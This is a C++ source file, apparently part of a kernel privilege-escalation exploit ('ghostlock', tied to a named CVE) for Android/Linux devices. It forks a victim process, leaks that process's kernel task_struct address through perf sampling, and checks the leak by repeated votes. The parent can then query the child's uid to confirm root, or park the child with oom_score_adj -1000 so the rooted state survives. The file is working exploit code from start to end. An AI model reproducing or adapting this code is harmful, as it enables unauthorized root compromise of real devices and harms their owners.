/** @file backend/victim/victim_process.cpp
 *  The victim process protocol, minimal subset (照退役 victim/victim_process.cpp)：
 *  fork 受害者 ⇒ 子侧 perf 泄漏自己的 task_struct ⇒ 送回父侧 ⇒ 父侧可命令它报 uid / 驻留 / 交接。
 *
 *  三条**必须原样**的细节（退役原话）：
 *   1. "a real leak reproduces, a fluke vote winner does not. w2 writes to this address, so two runs
 *      must agree or the leak is discarded." ⇒ 泄漏要**两次一致**才送回 ✓；
 *   2. "rooted exits kfree the static init_cred (w2 stores it with no get_cred). park forever,
 *      oom_score_adj -1000 so lmkd skips us." ⇒ 驻留子进程把 oom_score_adj 压到 -1000 后 pause ✓；
 *   3. 子进程自成进程组（父侧按组杀 ✓），uid 探针管道设 FD_CLOEXEC（不许漏进 root shell 链 ✓）。
 *
 *  设备专用。
 */
#include "backend/victim/victim_process.hpp"

#include <cerrno>
#include <fcntl.h>
#include <cstdio>
#include <cstring>
#include <unistd.h>

#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#include "backend/cve_2026_43499/perf_ring.hpp"
#include "backend/cve_2026_43499/perf_seam_linux.hpp"
#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
#include "backend/cve_2026_43499/perf_vote.hpp"

namespace ghostlock::backend::victim {
    namespace {
        namespace pf = ghostlock::backend::cve_2026_43499;  // 禁用 using 别名 ⇒ 直接全限定
        
        

        /* 采样参数照**探针的真值**（tools/perf_seam_probe.cpp:46-48）与退役 primitives.cpp:68 一致：
         *  period=5000、自旋 500000 轮。此前我按 1/2000 填，采样量差两个数量级 ⇒ 投票必然不稳。 */
        inline constexpr std::uint64_t kSamplePeriod = 5000U;
        /* 环长度必须形如 (1 + 2^n) 页（perf 的硬性要求）；探针用 kPages*kPageBytes ✓，照抄。 */
        inline constexpr std::size_t kRingPages = 1U + 8U;
        inline constexpr std::size_t kPageBytes = 4096U;
        inline constexpr std::size_t kMapBytes = kRingPages * kPageBytes;
        inline constexpr std::size_t kSpinRounds = 500000U;
        inline constexpr std::size_t kKeptWords = 256U;

        /** 读 ring 头里的一个 64 位字（探针同形）。 */
        std::uint64_t read_word(const unsigned char *base, std::size_t offset) noexcept {
            std::uint64_t value = 0U;
            std::memcpy(&value, base + offset, sizeof(value));
            return value;
        }

        /** 一次 perf 采样 + 投票 ⇒ 子进程自己的 task_struct 地址（0 = 没投出来）。 */
        std::uint64_t perf_find_task() noexcept {
            pf::PerfOpenArgs args{};
            args.type = PERF_TYPE_SOFTWARE;
            args.config = pf::kPerfCountSwCpuClock;
            args.sample_period = kSamplePeriod;
            args.pid = 0;
            args.cpu = -1;
            args.sample_type = pf::kPerfSampleIpBit | pf::kPerfSampleRegsIntrBit;
            args.sample_regs_intr = (1ULL << 32U) - 1ULL;
            args.start_disabled = true;
            args.exclude_user = false;
            args.exclude_hv = true;
            args.exclude_idle = true;
            const pf::SeamResult opened = pf::LinuxPerfSeam::perf_open(args);
            std::printf(" PFOPEN fd=%lld errno=%d", static_cast<long long>(opened.value), opened.error);
            if (opened.value < 0) {
                return 0U;
            }
            const auto fd = static_cast<std::int32_t>(opened.value);
            auto *base = static_cast<unsigned char *>(pf::LinuxPerfSeam::perf_map(fd, kMapBytes));
            std::printf(" PFMAP %s", base != nullptr ? "ok" : "null");
            if (base == nullptr) {
                (void) pf::memory::LinuxHeapSeam::close_fd(fd);
                return 0U;
            }
            const std::uint64_t data_offset = read_word(base, pf::kPerfDataOffsetOffset);
            const std::uint64_t data_size = read_word(base, pf::kPerfDataSizeOffset);
            (void) pf::LinuxPerfSeam::perf_ioctl(fd, pf::kPerfEventIocEnable);
            for (std::size_t i = 0U; i < kSpinRounds; ++i) {
                (void) pf::LinuxPerfSeam::spin_once();
            }
            (void) pf::LinuxPerfSeam::perf_ioctl(fd, pf::kPerfEventIocDisable);
            /* perf 事件 ABI：data_head/data_tail 就排在两个指针之后 ✓（探针同形 ✓）。 */
            const std::uint64_t head = read_word(base, pf::kPerfDataHeadOffset);
            std::printf(" PFHEAD %llu", static_cast<unsigned long long>(head));
            pf::RingView ring{};
            /* 探针同形：走查的缓冲从 base + data_offset 起（我先前写成 base ⇒ 一个样本都读不到）。 */
            ring.buffer = base + data_offset;
            /* 探针同形（perf_seam_probe.cpp:109）：头里的 data_size 为 0 时按 8 页算，否则走查会读到 0 个样本。 */
            ring.data_size = static_cast<std::size_t>(data_size == 0U ? kPageBytes * 8U : data_size);
            ring.head = head;
            ring.tail = 0U;   /* 探针同形：tail 由调用方持有，这里不动 ✓ */
            const pf::DirectMapBounds bounds{0xffffff0000000000ULL, 0xffffffffffffffffULL};
            std::uint64_t values[kKeptWords] = {};
            const pf::RingOutcome outcome = pf::walk_perf_ring(ring, bounds, values, kKeptWords);
            std::printf(" PFSAMPLES %zu kept=%zu", outcome.samples, outcome.kept);
            const std::uint64_t voted = pf::vote_for_task(values, outcome.kept);
            static_cast<void>(::munmap(base, kMapBytes));
            (void) pf::memory::LinuxHeapSeam::close_fd(fd);
            return voted;
        }

        /** 拿到 root 之后**永久驻留**（退出会 kfree 静态 init_cred ✓）。 */
        void park_child_process_forever() noexcept {
            const std::int32_t adj = ::open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC);
            if (adj >= 0) {
                static constexpr char kValue[] = "-1000";
                ssize_t nw = ::write(adj, kValue, sizeof(kValue) - 1U);
                (void) nw;
                static_cast<void>(::close(adj));
            }
            for (;;) {
                ::pause();
            }
        }

        /** 子侧：关掉父侧端、自成进程组、泄漏自己的 task、跑命令循环。 */
        [[noreturn]] void child_main(VictimContext &context) noexcept {
            /* 子进程的 stdout 不是 tty（整条经 adb 管道）⇒ 全缓冲；不设无缓冲的话 _exit 会丢掉全部打印
             *  （探针开头同形 ✓）。 */
            (void) std::setvbuf(stdout, nullptr, _IONBF, 0U);
            if (context.task_read >= 0) { static_cast<void>(::close(context.task_read)); }
            if (context.cmd_write >= 0) { static_cast<void>(::close(context.cmd_write)); }
            if (context.uid_read >= 0) { static_cast<void>(::close(context.uid_read)); }
            context.task_read = -1;
            context.cmd_write = -1;
            context.uid_read = -1;
            static_cast<void>(::setpgid(0, 0));
            static_cast<void>(::prctl(PR_SET_NAME, "ghostleaf_0123456789"));
            /* 铁律：两次一致才采信（w2 会往这个地址写 ✓）。 */
            std::uint64_t my_task = perf_find_task();
            std::printf("VOTES vote0=0x%llx", static_cast<unsigned long long>(my_task));
            for (std::int32_t attempt = 0; attempt < 2 && my_task != 0U; ++attempt) {
                const std::uint64_t again = perf_find_task();
                std::printf(" vote%d=0x%llx", attempt + 1, static_cast<unsigned long long>(again));
                if (again == my_task) {
                    break;
                }
                my_task = again;
                if (attempt == 1) {
                    my_task = 0U;   /* 两次不一致 ⇒ 丢弃 ✓ */
                }
            }
            const ssize_t wrote = ::write(context.task_write, &my_task, sizeof(my_task));
            (void) wrote;
            if (context.task_write >= 0) { static_cast<void>(::close(context.task_write)); }
            context.task_write = -1;
            if (my_task == 0U) {
                ::_exit(1);
            }
            char command = 0;
            while (::read(context.cmd_read, &command, 1) == 1) {
                if (command == 'C') {
                    const std::uint32_t uid = static_cast<std::uint32_t>(::getuid());
                    const ssize_t nw = ::write(context.uid_write, &uid, sizeof(uid));
                    (void) nw;
                } else if (command == 'M') {
                    /* M：报 comm 的长度与首字节（旧码同形 ⇒ 用来分辨写落在 [target] 还是 [target+8]）。 */
                    char comm[24] = {};
                    const std::int32_t fd = ::open("/proc/self/comm", O_RDONLY | O_CLOEXEC);
                    if (fd >= 0) {
                        ssize_t nr = 0;
                        while ((nr = ::read(fd, comm, sizeof(comm) - 1U)) < 0 && errno == EINTR) {
                        }
                        (void) nr;
                        static_cast<void>(::close(fd));
                    }
                    std::size_t len = 0U;
                    while (comm[len] != 0) { ++len; }
                    while (len > 0U && comm[len - 1U] == '\n') { comm[len - 1U] = 0; --len; }
                    const std::uint32_t report = (static_cast<std::uint32_t>(len) << 8U) |
                                                 static_cast<std::uint32_t>(static_cast<unsigned char>(comm[0]));
                    const ssize_t nw = ::write(context.uid_write, &report, sizeof(report));
                    (void) nw;
                } else if (command == 'P') {
                    park_child_process_forever();
                } else if (command == 'G' || command == 'X') {
                    break;
                }
            }
            if (context.cmd_read >= 0) { static_cast<void>(::close(context.cmd_read)); }
            context.cmd_read = -1;
            if (context.uid_write >= 0) { static_cast<void>(::close(context.uid_write)); }
            context.uid_write = -1;
            ::_exit(::getuid() == 0U ? 0 : 1);
        }

        bool write_command(VictimContext &context, char command) noexcept {
            if (context.cmd_write < 0) {
                return false;
            }
            return ::write(context.cmd_write, &command, 1) == 1;
        }
    }  // namespace

    SpawnRefusal spawn_victim(VictimContext &context, VictimSpawn &out) noexcept {
        int32_t task_pipe[2] = {-1, -1};
        int32_t cmd_pipe[2] = {-1, -1};
        int32_t uid_pipe[2] = {-1, -1};
        if (::pipe(task_pipe) != 0 || ::pipe(cmd_pipe) != 0 || ::pipe(uid_pipe) != 0) {
            return SpawnRefusal::Pipes;
        }
        context.task_read = task_pipe[0];
        context.task_write = task_pipe[1];
        context.cmd_read = cmd_pipe[0];
        context.cmd_write = cmd_pipe[1];
        context.uid_read = uid_pipe[0];
        context.uid_write = uid_pipe[1];
        const pid_t child = ::fork();
        if (child < 0) {
            /* 诊断（第 6 轮 ✓）：fork 失败必须留下 **errno** ✗ ——
             *  EAGAIN ⇒ 进程/线程上限（每轮 spawn 累计 ✓）；ENOMEM ⇒ 内存 ✓。 */
            const int fork_errno = errno;
            std::printf("main: victim fork failed errno=%d", fork_errno);
            context.close_ends();
            return SpawnRefusal::Fork;
        }
        if (child == 0) {
            child_main(context);
        }
        /* 父侧只留自己那一半 ✓。 */
        static_cast<void>(::close(context.task_write));
        static_cast<void>(::close(context.cmd_read));
        static_cast<void>(::close(context.uid_write));
        context.task_write = -1;
        context.cmd_read = -1;
        context.uid_write = -1;
        context.set_child(child);
        std::uint64_t task = 0U;
        ssize_t got = 0;
        while ((got = ::read(context.task_read, &task, sizeof(task))) < 0 && errno == EINTR) {
        }
        static_cast<void>(::close(context.task_read));
        context.task_read = -1;
        if (got != static_cast<ssize_t>(sizeof(task)) || task == 0U) {
            /* 泄漏没成（多半是两次不一致 ✓）：收掉这个子进程，绝不留半个 ✓，由调用方决定是否重试 ✓。 */
            context.close_ends();
            context.retire_child();
            return SpawnRefusal::LeakDisagreed;
        }
        out.pid = child;
        out.task = task;
        return SpawnRefusal::Ok;
    }

    bool victim_report_uid(VictimContext &context, std::uint32_t &uid) noexcept {
        if (!write_command(context, 'C')) {
            return false;
        }
        std::uint32_t value = 0U;
        ssize_t got = 0;
        while ((got = ::read(context.uid_read, &value, sizeof(value))) < 0 && errno == EINTR) {
        }
        if (got != static_cast<ssize_t>(sizeof(value))) {
            return false;
        }
        uid = value;
        return true;
    }

    bool victim_report_comm(VictimContext &context, std::uint32_t &report) noexcept {
        if (!write_command(context, 'M')) {
            return false;
        }
        std::uint32_t value = 0U;
        ssize_t got = 0;
        while ((got = ::read(context.uid_read, &value, sizeof(value))) < 0 && errno == EINTR) {
        }
        if (got != static_cast<ssize_t>(sizeof(value))) {
            return false;
        }
        report = value;
        return true;
    }

    bool victim_park(VictimContext &context) noexcept {
        if (!write_command(context, 'P')) {
            return false;
        }
        /* 驻留后子侧会关掉命令端 ⇒ 本侧也随之收尾（**不**回收它的 pid：它要活着 ✓）。 */
        if (context.cmd_write >= 0) { static_cast<void>(::close(context.cmd_write)); }
        context.cmd_write = -1;
        return true;
    }

    bool victim_handoff(VictimContext &context) noexcept {
        if (!write_command(context, 'X')) {
            return false;
        }
        if (context.cmd_write >= 0) { static_cast<void>(::close(context.cmd_write)); }
        context.cmd_write = -1;
        return true;
    }
}  // namespace ghostlock::backend::victim
